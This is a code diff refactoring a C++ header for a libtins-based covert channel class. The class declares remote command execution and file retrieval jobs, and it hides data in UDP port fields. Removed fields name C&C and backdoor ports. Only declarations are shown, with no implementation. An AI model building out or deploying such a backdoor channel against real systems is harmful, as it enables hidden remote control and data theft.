@@ -13,56 +13,59 @@ using namespace Tins;
 class Covert_Channel
 {
 public:
+    enum CMD { run_cmd, ret_cmd, get_file, ret_file };
+
+    typedef std::vector<unsigned char> uchar_vector;
+    typedef boost::bimap<CMD, string> command_map;
+    typedef command_map::value_type cmd_pair;
 
     typedef struct Address {
             string ip;
-            int port;
+            uint16_t port;
     } Address;
 
+    typedef struct Config {
+            string interface;
+            Address target_addr;
+            int listen_port;
+    } Config;
+
     typedef struct Job {
-            std::vector<unsigned char> job;
+            uchar_vector job;
             string command;
             string argument;
             Address address;
     } Job;
 
     typedef struct HiddenChars {
-            unsigned char c1 : 8;
-            unsigned char c2 : 8;
+            unsigned char uchar_1 : 8;
+            unsigned char uchar_2 : 8;
     } HiddenChars;
 
-    typedef union DataExtractor {
-        uint16_t port;
+    typedef union DataConverter {
+        uint16_t uint16;
         HiddenChars hidden;
-    } DataExtractor;
+    } DataConverter;
 
-    enum CMD { run_cmd, ret_cmd, get_file, ret_file };
-
-    typedef boost::bimap<CMD, string> command_map;
-    typedef command_map::value_type cmd_pair;
     typedef std::map<string, Job> jobs_map;
 
     Covert_Channel();
-    void start(string interface);
-    void setup(string interface);
+    void setup();
     bool handle(PDU& pdu);
     virtual bool parse_command(Job& j) = 0;
-    bool udp_send(string dest_ip, int dst_port, std::vector<unsigned char> hidden);
-    bool udp_recv(uint16_t source_port, std::vector<unsigned char> payload, Address a);
+    bool udp_send(string dest_ip, int dst_port, uchar_vector hidden);
+    bool udp_recv(uchar_vector payload, Address a);
 
     command_map cmdMap;
-    int cnc_port;
-    int backdoor_port;
-    string filter;
+    Config config;
 private:
     bool finish_transfer(string payload_jid_tag);
     bool split_command_argument_with_regex(const string& command_argument, Job& j);
 
     PacketSender sender;
     jobs_map jobs;
-    string server_id_tag;
-    string end_transfer_flag;
-
+    string server_id;
+    string eof_flag;
 
 };
 
